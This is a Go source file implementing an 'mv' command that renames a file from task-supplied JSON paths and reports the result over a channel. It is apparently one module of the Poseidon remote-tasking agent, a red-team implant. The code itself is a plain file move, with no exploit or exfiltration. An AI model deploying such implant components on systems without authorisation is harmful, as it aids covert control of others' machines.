package mv

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type Arguments struct {
	SourceFile      string `json:"src"`
	DestinationFile string `json:"dst"`
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task

	var args Arguments
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	if _, err = os.Stat(args.SourceFile); os.IsNotExist(err) {
		tMsg.TaskResult = []byte(fmt.Sprintf("File '%s' does not exist.", args.SourceFile))
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	err = os.Rename(args.SourceFile, args.DestinationFile)

	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(fmt.Sprintf("Moved %s to %s", args.SourceFile, args.DestinationFile))
	threadChannel <- tMsg
}
